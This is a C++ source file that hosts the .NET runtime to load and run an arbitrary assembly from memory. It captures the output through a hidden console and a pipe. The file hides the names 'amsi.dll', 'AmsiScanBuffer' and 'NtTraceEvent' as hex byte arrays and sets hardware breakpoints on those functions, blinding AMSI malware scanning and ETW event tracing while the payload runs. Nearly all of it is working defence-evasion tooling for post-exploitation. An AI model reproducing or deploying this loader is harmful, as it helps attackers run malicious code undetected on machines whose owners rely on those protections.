#include <Windows.h>
#include <metahost.h>
#include <cstdio>
#include <ntstatus.h>
#include "HwBpEngine.h"
#include "winternal.h"  

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "wininet.lib")

#define PIPE_BUFFER_LENGTH (0x10000 * 5)

namespace mscorlib {
#include "mscorlib.h"
}

static const char s_amsi_dll[] = { 0x61,0x6D,0x73,0x69,0x2E,0x64,0x6C,0x6C,0x00 };  
static const char s_amsi_scan_buffer[] = { 0x41,0x6D,0x73,0x69,0x53,0x63,0x61,0x6E,0x42,0x75,0x66,0x66,0x65,0x72,0x00 };
static const char s_ntdll_dll[] = { 0x6E,0x74,0x64,0x6C,0x6C,0x2E,0x64,0x6C,0x6C,0x00 };            
static const char s_nt_trace_event[] = { 0x4E,0x74,0x54,0x72,0x61,0x63,0x65,0x45,0x76,0x65,0x6E,0x74,0x00 }; 

static const WCHAR s_clr_v4[] = {
    0x0076,0x0034,0x002E,0x0030,0x002E,0x0033,0x0030,0x0033,0x0031,0x0039,0x0000
}; 

static const WCHAR s_clr_v2[] = {
    0x0076,0x0032,0x002E,0x0030,0x002E,0x0035,0x0030,0x0037,0x0032,0x0037,0x0000
};

HRESULT DotnetExecute(
    _In_  PBYTE  AssemblyBytes,
    _In_  ULONG  AssemblySize,
    _In_  PWSTR  AppDomainName,
    _In_  PWSTR  Arguments,
    _Out_ LPSTR* OutputBuffer,
    _Out_ PULONG OutputLength
)
{
    HRESULT HResult = S_OK;
    ICLRMetaHost* IMetaHost = nullptr;
    ICLRRuntimeInfo* IRuntimeInfo = nullptr;
    ICorRuntimeHost* IRuntimeHost = nullptr;
    IUnknown* IAppDomainThunk = nullptr;
    mscorlib::_AppDomain* AppDomain = nullptr;
    mscorlib::_Assembly* Assembly = nullptr;
    mscorlib::_MethodInfo* MethodInfo = nullptr;
    SAFEARRAYBOUND SafeArrayBound = { AssemblySize, 0 };
    SAFEARRAY* SafeAssembly = nullptr;
    SAFEARRAY* SafeExpected = nullptr;
    SAFEARRAY* SafeArguments = nullptr;
    PWSTR* AssemblyArgv = nullptr;
    ULONG AssemblyArgc = 0;
    LONG Index = 0;
    VARIANT VariantArgv = {};
    BOOL IsLoadable = FALSE;
    HWND ConExist = nullptr;
    HWND ConHandle = nullptr;
    HANDLE BackupHandle = nullptr;
    HANDLE IoPipeRead = nullptr;
    HANDLE IoPipeWrite = nullptr;
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    HANDLE ExceptionHandle = nullptr;

    // Create the CLR instance.
    CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<PVOID*>(&IMetaHost));

    // Try multiple CLR versions.
    const wchar_t* clrVersions[] = { s_clr_v4, s_clr_v2 };
    int clrVersionCount = static_cast<int>(sizeof(clrVersions) / sizeof(clrVersions[0]));
    for (int i = 0; i < clrVersionCount; i++) {
        IMetaHost->GetRuntime(clrVersions[i], IID_ICLRRuntimeInfo, reinterpret_cast<PVOID*>(&IRuntimeInfo));
        if (IRuntimeInfo)
            break;
    }

    IRuntimeInfo->IsLoadable(&IsLoadable);
    IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<PVOID*>(&IRuntimeHost));
    IRuntimeHost->Start();
    IRuntimeHost->CreateDomain(AppDomainName, nullptr, &IAppDomainThunk);
    IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain));

    SafeAssembly = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);
    memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);

    // Replace standard GetProcAddress calls with our custom replacements from winternal.h.
    SetUniqueHardwareBreakpoint(0, reinterpret_cast<LPVOID>(
        GetProcAddressReplacement(LoadLibraryA(s_amsi_dll), s_amsi_scan_buffer)
        ));
    SetUniqueHardwareBreakpoint(1, reinterpret_cast<LPVOID>(
        GetProcAddressReplacement(LoadLibraryA(s_ntdll_dll), s_nt_trace_event)
        ));
    ExceptionHandle = AddVectoredExceptionHandler(TRUE, reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>(HandleUniqueHwbpException));

    AppDomain->Load_3(SafeAssembly, &Assembly);
    Assembly->get_EntryPoint(&MethodInfo);
    MethodInfo->GetParameters(&SafeExpected);

    if (SafeExpected && SafeExpected->cDims && SafeExpected->rgsabound[0].cElements)
    {
        SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        if (wcslen(Arguments))
            AssemblyArgv = CommandLineToArgvW(Arguments, reinterpret_cast<PINT>(&AssemblyArgc));
        VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
        VariantArgv.vt = (VT_ARRAY | VT_BSTR);
        for (Index = 0; Index < static_cast<LONG>(AssemblyArgc); Index++)
            SafeArrayPutElement(VariantArgv.parray, &Index, SysAllocString(AssemblyArgv[Index]));
        Index = 0;
        SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
        SafeArrayDestroy(VariantArgv.parray);
    }

    CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, PIPE_BUFFER_LENGTH);
    ConExist = GetConsoleWindow();
    if (!ConExist)
    {
        AllocConsole();
        ConHandle = GetConsoleWindow();
        if (ConHandle)
            ShowWindow(ConHandle, SW_HIDE);
    }
    BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);

    MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr);

    *OutputBuffer = static_cast<LPSTR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_LENGTH));
    ReadFile(IoPipeRead, *OutputBuffer, PIPE_BUFFER_LENGTH, OutputLength, nullptr);

    // Cleanup block at the end of the function.
    SetUniqueHardwareBreakpoint(0, nullptr);
    SetUniqueHardwareBreakpoint(1, nullptr);
    if (ExceptionHandle)
        RemoveVectoredExceptionHandler(ExceptionHandle);
    if (BackupHandle)
        SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
    if (IoPipeRead)
        CloseHandle(IoPipeRead);
    if (IoPipeWrite)
        CloseHandle(IoPipeWrite);
    if (AssemblyArgv)
    {
        HeapFree(GetProcessHeap(), 0, AssemblyArgv);
        AssemblyArgv = nullptr;
    }
    if (SafeAssembly)
    {
        SafeArrayDestroy(SafeAssembly);
        SafeAssembly = nullptr;
    }
    if (SafeArguments)
    {
        SafeArrayDestroy(SafeArguments);
        SafeArguments = nullptr;
    }
    if (MethodInfo)
        MethodInfo->Release();
    if (IRuntimeHost)
        IRuntimeHost->Release();
    if (IRuntimeInfo)
        IRuntimeInfo->Release();
    if (IMetaHost)
        IMetaHost->Release();

    return HResult;
}
